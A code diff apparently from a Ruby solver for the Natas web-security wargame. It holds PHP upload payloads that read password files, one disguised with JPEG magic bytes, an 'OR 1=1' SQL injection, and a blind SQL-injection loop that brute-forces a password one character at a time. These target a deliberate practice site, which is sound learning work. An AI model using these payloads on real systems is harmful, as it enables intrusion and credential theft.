@@ -50,6 +50,7 @@ class NatasLevelBase
   LOGIN = 'natas'
   WEBPASS = '/etc/natas_webpass'
   LEVEL = nil
+  PASSWORD_LENGTH = 32
 
   attr_reader :login
   attr_accessor :password
@@ -396,7 +397,7 @@ end
 class NatasLevel12 < NatasLevelBase
   LEVEL = 12
   PAGE = '/'
-  PAYLOAD = %[<? echo(file_get_contents('#{WEBPASS}/natas13')); ?>]
+  PAYLOAD = %(<? echo(file_get_contents('#{WEBPASS}/natas13')); ?>)
 
   def exec
     data = [
@@ -421,7 +422,7 @@ end
 class NatasLevel13 < NatasLevelBase
   LEVEL = 13
   PAGE = '/'
-  PAYLOAD = %[\xff\xd8\xff<? echo(file_get_contents('#{WEBPASS}/natas14')); ?>]
+  PAYLOAD = %(\xff\xd8\xff<? echo(file_get_contents('#{WEBPASS}/natas14')); ?>)
 
   def exec
     data = [
@@ -446,7 +447,7 @@ end
 class NatasLevel14 < NatasLevelBase
   LEVEL = 14
   PAGE = '/'
-  PAYLOAD = %[" OR 1=1 #]
+  PAYLOAD = %(" OR 1=1 #)
 
   def exec
     data = post(
@@ -467,4 +468,37 @@ end
 # Levle 15
 class NatasLevel15 < NatasLevelBase
   LEVEL = 15
+  PAGE = '/'
+  DICT =
+    ('a'..'z').to_a +
+    ('A'..'Z').to_a +
+    ('0'..'9').to_a
+
+  def exec
+    password = String.new
+    log('Bruteforcing password')
+    PASSWORD_LENGTH.times do
+      DICT.each do |c|
+        payload = %(natas16" AND password LIKE BINARY "#{password}#{c}%" #)
+        data = post(
+          PAGE,
+          {},
+          { 'username' => payload }
+        ).body
+        match = /This user exists/.match(data)
+        if match
+          log(password << c)
+          break
+        end
+      end
+    end
+
+    found(password)
+  end
+end
+
+##
+# Level 16
+class NatasLevel16 < NatasLevelBase
+  LEVEL = 16
 end
